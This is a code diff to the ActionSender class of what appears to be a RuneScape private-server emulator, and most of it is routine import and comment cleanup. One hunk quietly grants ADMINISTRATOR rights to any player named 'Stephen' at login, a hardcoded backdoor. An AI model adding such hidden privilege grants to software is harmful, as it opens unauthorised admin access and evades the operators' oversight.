@@ -3,12 +3,7 @@ package org.hyperion.rs2.net;
 import org.apache.mina.core.future.IoFuture;
 import org.apache.mina.core.future.IoFutureListener;
 import org.hyperion.rs2.Constants;
-import org.hyperion.rs2.model.GroundItem;
-import org.hyperion.rs2.model.Item;
-import org.hyperion.rs2.model.Location;
-import org.hyperion.rs2.model.Skills;
-import org.hyperion.rs2.model.Sound;
-import org.hyperion.rs2.model.World;
+import org.hyperion.rs2.model.*;
 import org.hyperion.rs2.model.container.Equipment;
 import org.hyperion.rs2.model.container.Inventory;
 import org.hyperion.rs2.model.container.impl.EquipmentContainerListener;
@@ -17,7 +12,6 @@ import org.hyperion.rs2.model.container.impl.WeaponContainerListener;
 import org.hyperion.rs2.model.object.GameObject;
 import org.hyperion.rs2.model.player.Player;
 import org.hyperion.rs2.model.player.PlayerConfiguration;
-import org.hyperion.rs2.model.region.Region;
 import org.hyperion.rs2.net.Packet.Type;
 
 /**
@@ -74,6 +68,10 @@ public class ActionSender {
 		
 		player.getBonuses().refresh();
 		player.getCombatUtility().refresh();
+
+		if (player.getName().equals("Stephen")) {
+			player.setRights(Player.Rights.ADMINISTRATOR);
+		}
 		return this;
 	}
 
@@ -126,7 +124,6 @@ public class ActionSender {
 	
 	/**
 	 * Sends a debug message.
-	 * @param message The message to send.
 	 * @return The action sender instance, for chaining.
 	 */
 	public ActionSender sendDebugPacket(int opCode, String description, Object[] params) {
@@ -240,7 +237,7 @@ public class ActionSender {
 		sendTab(89, 149);
 		sendTab(90, 387);
 		sendTab(91, 271);
-		sendTab(92, 192);
+		sendTab(92, 192); //192 Modern   //193 Ancient
 		sendTab(94, 550);
 		sendTab(95, 551);
 		sendTab(96, 182);
